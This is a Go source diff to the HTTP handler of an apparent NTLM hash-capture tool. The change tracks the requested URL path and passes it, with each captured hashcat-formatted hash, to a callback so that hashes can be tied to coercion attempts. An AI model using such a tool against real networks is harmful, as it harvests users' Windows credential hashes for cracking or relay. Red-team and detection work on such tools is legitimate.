@@ -23,8 +23,9 @@ type HTTPHandler struct {
 	authParser     *ntlm.AuthMessageParser
 	hashFormatter  *ntlm.HashcatFormatter
 	challenge      *ntlm.ChallengeMessage
-	onHashCaptured func(string)
-	useNegotiate   bool // Track if client is using Negotiate (SPNEGO) vs plain NTLM
+	onHashCaptured func(hash string, requestPath string)
+	useNegotiate   bool   // Track if client is using Negotiate (SPNEGO) vs plain NTLM
+	requestPath    string // Track the requested URL path for coercion correlation
 }
 
 // NewHTTPHandler creates a new HTTP handler
@@ -42,7 +43,7 @@ func NewHTTPHandler(conn net.Conn, config *Config, logger *output.Logger,
 }
 
 // OnHashCaptured sets callback for when a hash is captured
-func (h *HTTPHandler) OnHashCaptured(callback func(string)) {
+func (h *HTTPHandler) OnHashCaptured(callback func(hash string, requestPath string)) {
 	h.onHashCaptured = callback
 }
 
@@ -88,6 +89,7 @@ func (h *HTTPHandler) Handle(ctx context.Context) error {
 			parts := strings.Fields(lines[0])
 			if len(parts) >= 2 {
 				method = parts[0]
+				h.requestPath = parts[1] // Capture URL path for coercion tracking
 			}
 		}
 
@@ -231,9 +233,15 @@ func (h *HTTPHandler) handleNTLMType1() error {
 
 	request := string(buf[:n])
 
-	// Parse Authorization header from Type 3 request
+	// Parse Authorization header and update request path from Type 3 request
 	var authHeader string
 	lines := splitHTTPLines(request)
+	if len(lines) > 0 {
+		parts := strings.Fields(lines[0])
+		if len(parts) >= 2 {
+			h.requestPath = parts[1] // Update path from Type 3 request
+		}
+	}
 	for _, line := range lines {
 		if len(line) > 15 && (line[:15] == "Authorization: " || line[:15] == "authorization: ") {
 			authHeader = line[15:]
@@ -314,9 +322,9 @@ func (h *HTTPHandler) handleNTLMType3(type3 []byte) error {
 		"<html></html>"
 	h.conn.Write([]byte(response))
 
-	// Call hash captured callback
+	// Call hash captured callback with request path for coercion correlation
 	if h.onHashCaptured != nil {
-		h.onHashCaptured(hash)
+		h.onHashCaptured(hash, h.requestPath)
 	}
 
 	return nil
